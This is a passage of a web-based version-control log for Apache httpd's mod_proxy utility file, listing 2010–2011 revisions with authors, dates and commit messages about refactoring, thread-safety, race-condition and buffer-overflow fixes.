([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1058624&r2=1058625&diff_format=h))
```
Builds and passes tests as prefork... good save state

```

---

Revision [**1058624**](/viewvc?view=revision&revision=1058624) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1058624&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1058624&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1058624))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1058624)

Modified
*Thu Jan 13 15:59:02 2011 UTC*
(14 years ago)
by *jim*

File length: 91732 byte(s)

Diff to [previous 1058623](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1058623&r2=1058624)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1058623&r2=1058624&diff_format=h))
```
Adjust for conf->workers being *proxy_worker and balancer->workers being **proxy_worker

```

---

Revision [**1058623**](/viewvc?view=revision&revision=1058623) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1058623&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1058623&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1058623))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1058623)

Modified
*Thu Jan 13 15:58:57 2011 UTC*
(14 years ago)
by *jim*

File length: 90855 byte(s)

Diff to [previous 1058622](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1058622&r2=1058623)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1058622&r2=1058623&diff_format=h))
```
More movement to shared stuff...

```

---

Revision [**1058622**](/viewvc?view=revision&revision=1058622) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1058622&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1058622&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1058622))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1058622)

Modified
*Thu Jan 13 15:58:50 2011 UTC*
(14 years ago)
by *jim*

File length: 90610 byte(s)

Diff to [previous 1058621](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1058621&r2=1058622)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1058621&r2=1058622&diff_format=h))
```
OK... a good commit point (we don't quite compile yet though...)

Pull out the worker scoreboard cruft and start moving most
worker stuff to shm. Use slotmem for workers and provide
space for growth.

Redo logic:

  ap_proxy_define_*
  ap_proxy_create_*
  ap_proxy_initialize_*

Right now just for workers, but lay framework for balancers
as well. The idea is to break out the functional parts
to make it easy for dynamics. Defining is simply describing
the worker, and tucking that info away. When we create, we
go ahead and create the shared memory, etc... Initialize
is simply to allow child process to access the shm...

```

---

Revision [**1058621**](/viewvc?view=revision&revision=1058621) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1058621&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1058621&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1058621))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1058621)

Modified
*Thu Jan 13 15:58:45 2011 UTC*
(14 years ago)
by *jim*

File length: 93030 byte(s)

Diff to [previous 1055771](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1055771&r2=1058621)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1055771&r2=1058621&diff_format=h))
```
Use branch now

```

---

Revision [**1055771**](/viewvc?view=revision&revision=1055771) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1055771&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1055771&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1055771))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1055771)

Modified
*Thu Jan 6 07:24:22 2011 UTC*
(14 years ago)
by *rpluem*

File length: 93022 byte(s)

Diff to [previous 1055250](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1055250&r2=1055771)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1055250&r2=1055771&diff_format=h))
```
* Be ANSI C compatible

```

---

Revision [**1055250**](/viewvc?view=revision&revision=1055250) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1055250&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1055250&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1055250))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1055250)

Modified
*Wed Jan 5 00:23:43 2011 UTC*
(14 years ago)
by *minfrin*

File length: 93014 byte(s)

Diff to [previous 1053966](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1053966&r2=1055250)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1053966&r2=1055250&diff_format=h))
```
mod_proxy_http: Allocate the fake backend request from a child pool
of the backend connection, instead of misusing the pool of the frontend
request. Fixes a thread safety issue where buckets set aside in the
backend connection leak into other threads, and then disappear when
the frontend request is cleaned up, in turn causing corrupted buckets
to make other threads spin.

```

---

Revision [**1053966**](/viewvc?view=revision&revision=1053966) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1053966&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1053966&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1053966))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1053966)

Modified
*Thu Dec 30 18:28:26 2010 UTC*
(14 years ago)
by *minfrin*

File length: 92886 byte(s)

Diff to [previous 1052314](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1052314&r2=1053966)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1052314&r2=1053966&diff_format=h))
```
Fix a spin should we encounter a corrupt bucket from the proxy.

```

---

Revision [**1052314**](/viewvc?view=revision&revision=1052314) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1052314&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1052314&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1052314))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1052314)

Modified
*Thu Dec 23 16:43:43 2010 UTC*
(14 years, 1 month ago)
by *rpluem*

File length: 92854 byte(s)

Diff to [previous 1036605](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1036605&r2=1052314)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1036605&r2=1052314&diff_format=h))
```
* The concept of the cleaned flag is flawed: Once we returned the connection
  to the pool we cannot longer rely on it as another thread could have leased
  the connection in the meantime and might have modified it.
  BUT: We only use this flag once we returned the connection to the pool.
  So signal that we returned the connection to the pool by something that is
  local to the thread, in this case set backend to NULL if we already have
  returende the connection.

```

---

Revision [**1036605**](/viewvc?view=revision&revision=1036605) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1036605&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1036605&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1036605))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1036605)

Modified
*Thu Nov 18 20:20:12 2010 UTC*
(14 years, 2 months ago)
by *sf*

File length: 92947 byte(s)

Diff to [previous 1035576](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1035576&r2=1036605)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1035576&r2=1036605&diff_format=h))
```
Fix 'comparison is always false due to limited range of data type'.
One-bit flags should really be unsigned

```

---

Revision [**1035576**](/viewvc?view=revision&revision=1035576) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1035576&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1035576&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1035576))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1035576)

Modified
*Tue Nov 16 10:27:26 2010 UTC*
(14 years, 2 months ago)
by *minfrin*

File length: 92952 byte(s)

Diff to [previous 1035504](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1035504&r2=1035576)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1035504&r2=1035576&diff_format=h))
```
Revert [r1035504](/viewvc?view=revision&revision=1035504), this was the wrong way to do it.

```

---

Revision [**1035504**](/viewvc?view=revision&revision=1035504) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1035504&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1035504&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1035504))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1035504)

Modified
*Tue Nov 16 00:23:37 2010 UTC*
(14 years, 2 months ago)
by *minfrin*

File length: 91101 byte(s)

Diff to [previous 1034916](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1034916&r2=1035504)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1034916&r2=1035504&diff_format=h))
```
Fix pool lifetime issues when the proxy backend connection is terminated
early by forcing a setaside on transient buckets placed in the brigade
by mod_ssl. This has the effect of extending the lifetime of buckets until
the end of the request. This is a variation on the original fix for this
problem, which added transient buckets to be setaside later in the process.

```

---

Revision [**1034916**](/viewvc?view=revision&revision=1034916) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1034916&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1034916&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1034916))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1034916)

Modified
*Sun Nov 14 00:01:43 2010 UTC*
(14 years, 2 months ago)
by *niq*

File length: 92952 byte(s)

Diff to [previous 1032290](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1032290&r2=1034916)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1032290&r2=1034916&diff_format=h))
```
Fix mod_proxy to support setting source address.
PR 29404
Seems lots of users want this, and a couple of them have recenly asked nicely

```

---

Revision [**1032290**](/viewvc?view=revision&revision=1032290) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1032290&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1032290&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1032290))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1032290)

Modified
*Sun Nov 7 14:49:58 2010 UTC*
(14 years, 2 months ago)
by *trawick*

File length: 91996 byte(s)

Diff to [previous 1030850](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1030850&r2=1032290)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1030850&r2=1032290&diff_format=h))
```
log how long worker will be disabled

```

---

Revision [**1030850**](/viewvc?view=revision&revision=1030850) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1030850&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1030850&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1030850))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1030850)

Modified
*Thu Nov 4 08:09:57 2010 UTC*
(14 years, 2 months ago)
by *rjung*

File length: 91930 byte(s)

Diff to [previous 1029134](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1029134&r2=1030850)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1029134&r2=1030850&diff_format=h))
```
Followup to [r1026665](/viewvc?view=revision&revision=1026665): reset "cleaned" flag in
ap_proxy_acquire_connection().

```

---

Revision [**1029134**](/viewvc?view=revision&revision=1029134) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1029134&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1029134&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1029134))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1029134)

Modified
*Sat Oct 30 17:56:13 2010 UTC*
(14 years, 2 months ago)
by *poirier*

File length: 91904 byte(s)

Diff to [previous 1026665](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1026665&r2=1029134)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1026665&r2=1029134&diff_format=h))
```
Fix a number of typos and misspellings.  Reported by Ville Skytta.
PR48496.

```

---

Revision [**1026665**](/viewvc?view=revision&revision=1026665) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1026665&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1026665&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1026665))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1026665)

Modified
*Sat Oct 23 19:26:44 2010 UTC*
(14 years, 3 months ago)
by *minfrin*

File length: 91903 byte(s)

Diff to [previous 1025699](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1025699&r2=1026665)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1025699&r2=1026665&diff_format=h))
```
mod_proxy: Release the backend connection as soon as EOS is detected,
so the backend isn't forced to wait for the client to eventually
acknowledge the data.

```

---

Revision [**1025699**](/viewvc?view=revision&revision=1025699) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1025699&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1025699&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1025699))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1025699)

Modified
*Wed Oct 20 19:47:00 2010 UTC*
(14 years, 3 months ago)
by *minfrin*

File length: 91838 byte(s)

Diff to [previous 998949](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=998949&r2=1025699)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=998949&r2=1025699&diff_format=h))
```
Optimise the set flags in the mod_proxy structures.

```

---

Revision [**998949**](/viewvc?view=revision&revision=998949) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=998949&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=998949&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=998949))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=998949)

Modified
*Mon Sep 20 14:51:19 2010 UTC*
(14 years, 4 months ago)
by *jim*

File length: 91863 byte(s)

Diff to [previous 988635](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=988635&r2=998949)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=988635&r2=998949&diff_format=h))
```
Fold in possible use of FNV if desired

```

---

Revision [**988635**](/viewvc?view=revision&revision=988635) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=988635&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=988635&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=988635))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=988635)

Modified
*Tue Aug 24 18:04:06 2010 UTC*
(14 years, 5 months ago)
by *trawick*

File length: 91533 byte(s)

Diff to [previous 988038](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=988038&r2=988635)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=988038&r2=988635&diff_format=h))
```
ap_proxy_retry_worker() only needs to spit out one debug
message, and it should indicate whether or not retry will
be attempted

```

---

Revision [**988038**](/viewvc?view=revision&revision=988038) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=988038&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=988038&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=988038))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=988038)

Modified
*Mon Aug 23 09:09:25 2010 UTC*
(14 years, 5 months ago)
by *jfclere*

File length: 91515 byte(s)

Diff to [previous 985112](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=985112&r2=988038)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=985112&r2=988038&diff_format=h))
```
Prevent race condition
See <http://www.mail-archive.com/dev>@httpd.apache.org/msg47171.html

```

---

Revision [**985112**](/viewvc?view=revision&revision=985112) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=985112&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=985112&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=985112))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=985112)

Modified
*Fri Aug 13 07:24:36 2010 UTC*
(14 years, 5 months ago)
by *rpluem*

File length: 91515 byte(s)

Diff to [previous 984188](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=984188&r2=985112)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=984188&r2=985112&diff_format=h))
```
* The forward and reverse worker do not keep connections alive, so
  ensure that mod_proxy_http does the correct thing
  regarding the Connection header in the request.

```

---

Revision [**984188**](/viewvc?view=revision&revision=984188) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=984188&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=984188&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=984188))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=984188)

Modified
*Tue Aug 10 19:46:58 2010 UTC*
(14 years, 5 months ago)
by *jim*

File length: 90865 byte(s)

Diff to [previous 982016](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=982016&r2=984188)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=982016&r2=984188&diff_format=h))
```
Fold in some stuff to allow for matching of workers
to their actual scoreboard slots, independent of slot
ID.

```

---

Revision [**982016**](/viewvc?view=revision&revision=982016) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=982016&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=982016&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=982016))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=982016)

Modified
*Tue Aug 3 19:45:21 2010 UTC*
(14 years, 5 months ago)
by *sf*

File length: 89856 byte(s)

Diff to [previous 964089](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=964089&r2=982016)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=964089&r2=982016&diff_format=h))
```
- Remove a load of unused variables (or variables that are set but never read).
- Move some declarations into the correct #ifdef scope.

I couldn't compile/test netware, but the changes look obvious enough.

```

---

Revision [**964089**](/viewvc?view=revision&revision=964089) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=964089&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=964089&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=964089))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=964089)

Modified
*Wed Jul 14 16:03:19 2010 UTC*
(14 years, 6 months ago)
by *jim*

File length: 89855 byte(s)

Diff to [previous 951900](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=951900&r2=964089)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=951900&r2=964089&diff_format=h))
```
Allow for modules to keep track of worker slot
numbers themselves if they want, by allowing for
worker create/alloc functions to take a slot number id.
Done via _wid() variants of 3 proxy funcs.

```

---

Revision [**951900**](/viewvc?view=revision&revision=951900) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=951900&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=951900&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=951900))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=951900)

Modified
*Sun Jun 6 17:07:12 2010 UTC*
(14 years, 7 months ago)
by *sf*

File length: 88862 byte(s)

Diff to [previous 951895](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=951895&r2=951900)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=951895&r2=951900&diff_format=h))
```
- Be less verbose at levels INFO and DEBUG in mod_proxy* and mod_ssl
- Add some trace logging to core and http

```

---

Revision [**951895**](/viewvc?view=revision&revision=951895) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=951895&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=951895&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=951895))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=951895)

Modified
*Sun Jun 6 16:59:50 2010 UTC*
(14 years, 7 months ago)
by *sf*

File length: 88824 byte(s)

Diff to [previous 951189](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=951189&r2=951895)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=951189&r2=951895&diff_format=h))
```
Use the new APLOG_USE_MODULE/AP_DECLARE_MODULE macros everywhere to take
advantage of per-module loglevels

```

---

Revision [**951189**](/viewvc?view=revision&revision=951189) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=951189&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=951189&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=951189))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=951189)

Modified
*Thu Jun 3 22:47:46 2010 UTC*
(14 years, 7 months ago)
by *sf*

File length: 88798 byte(s)

Diff to [previous 910124](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=910124&r2=951189)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=910124&r2=951189&diff_format=h))
```
log issues with CONNECT at request scope instead of server scope

```

---

Revision [**910124**](/viewvc?view=revision&revision=910124) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=910124&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=910124&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=910124))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=910124)

Modified
*Sun Feb 14 23:45:59 2010 UTC*
(14 years, 11 months ago)
by *rjung*

File length: 88826 byte(s)

Diff to [previous 910081](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=910081&r2=910124)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=910081&r2=910124&diff_format=h))
```
Handle the pathological case of a connect
backend that sends us an unexpectedly huge response.

```

---

Revision [**910081**](/viewvc?view=revision&revision=910081) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=910081&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=910081&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=910081))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=910081)

Modified
*Sun Feb 14 21:37:36 2010 UTC*
(14 years, 11 months ago)
by *rjung*

File length: 88230 byte(s)

Diff to [previous 910079](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=910079&r2=910081)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=910079&r2=910081&diff_format=h))
```
We need to copy the forward proxy data, because it
might be reused during later requests using the same
backend connection.

```

---

Revision [**910079**](/viewvc?view=revision&revision=910079) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=910079&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=910079&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=910079))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=910079)

Modified
*Sun Feb 14 21:36:03 2010 UTC*
(14 years, 11 months ago)
by *rjung*

File length: 88180 byte(s)

Diff to [previous 909323](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=909323&r2=910079)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=909323&r2=910079&diff_format=h))
```
Limit sscanf format to the number of chars actually
needed and buffer size provided to prevent buffer overflow.

```

---

Revision [**909323**](/viewvc?view=revision&revision=909323) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=909323&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=909323&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=909323))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=909323)

Modified
*Fri Feb 12 09:58:48 2010 UTC*
(14 years, 11 months ago)
by *rjung*

File length: 88122 byte(s)

Diff to [previous 902245](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=902245&r2=909323)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=902245&r2=909323&diff_format=h))
```
Support remote https proxies by using HTTP CONNECT.
PR: 19188
Submitted by: Philippe Dutrueux <lilas evidian.com>
Reviewed by: rjung

```

---

Revision [**902245**](/viewvc?view=revision&revision=902245) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=902245&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=902245&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=902245))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=902245)

Modified
*Fri Jan 22 20:03:25 2010 UTC*
(15 years ago)
by *trawick*

File length: 82351 byte(s)

Diff to [previous 893955](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=893955&r2=902245)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=893955&r2=902245&diff_format=h))
```
fix maintainer mode ap_strstr() argument mismatch warnings

```

---

Revision [**893955**](/viewvc?view=revision&revision=893955) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=893955&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=893955&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=893955))
